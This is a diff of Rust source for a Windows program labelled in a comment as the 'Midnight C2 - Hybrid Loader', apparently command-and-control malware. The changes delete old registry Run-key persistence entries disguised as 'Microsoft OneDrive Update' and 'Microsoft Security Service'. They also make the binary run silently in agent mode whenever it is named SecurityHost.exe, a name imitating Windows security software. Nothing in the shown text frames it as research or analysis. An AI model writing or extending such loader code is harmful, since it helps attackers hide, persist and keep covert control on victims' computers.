@@ -13,6 +13,7 @@ use std::ptr;
 use std::os::windows::process::CommandExt;
 use std::path::Path;
 use windows::Win32::UI::Shell::IsUserAnAdmin;
+use windows::Win32::System::Registry::*;
 
 // Interface IIDs
 const IID_ICLR_META_HOST: GUID = GUID::from_u128(0xd332db9e_b9b3_4125_8207_a14884f53216);
@@ -211,6 +212,26 @@ fn uninstall_old_agent() {
             .args(&["/Delete", "/TN", task, "/F"])
             .creation_flags(0x08000000)
             .output();
+    }
+
+    // Cleanup Registry Persistence (to prevent startup popups)
+    unsafe {
+        let run_key = HSTRING::from(r"Software\Microsoft\Windows\CurrentVersion\Run");
+        let mut hkey = HKEY::default();
+        
+        // HKCU
+        if RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
+            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
+            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
+            let _ = RegCloseKey(hkey);
+        }
+
+        // HKLM
+        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
+            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
+            let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
+            let _ = RegCloseKey(hkey);
+        }
     }
     
     for _ in 0..3 {
@@ -443,10 +464,12 @@ fn main() -> windows::core::Result<()> {
         let is_target_path = current_lower == target_lower;
         let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
         
-        // Robust check: matches path OR (exe name AND parent folder name)
+        // Robust checks
         let is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "securityhealthservice");
+        let is_exe_match = current_exe_name == "securityhost.exe";
         
-        let is_agent_mode = (args.iter().any(|a| a == "agent")) || is_installed_location || is_system;
+        // If file is named SecurityHost.exe, assumes it's the agent to prevent UI popup on startup
+        let is_agent_mode = (args.iter().any(|a| a == "agent")) || is_installed_location || is_system || is_exe_match;
         
         if !is_agent_mode {
             // ===== INSTALLER MODE (with UI) =====
@@ -456,7 +479,7 @@ fn main() -> windows::core::Result<()> {
             std::thread::spawn(move || {
                 /*
                 append_log("╔════════════════════════════════════════╗");
-                append_log("║   Midnight C2 - Hybrid Loader v0.6.13 ║");
+                append_log("║   Midnight C2 - Hybrid Loader v0.6.15 ║");
                 append_log("║       Build Date: 2026-02-15          ║");
                 append_log("╚════════════════════════════════════════╝");
                 append_log("");
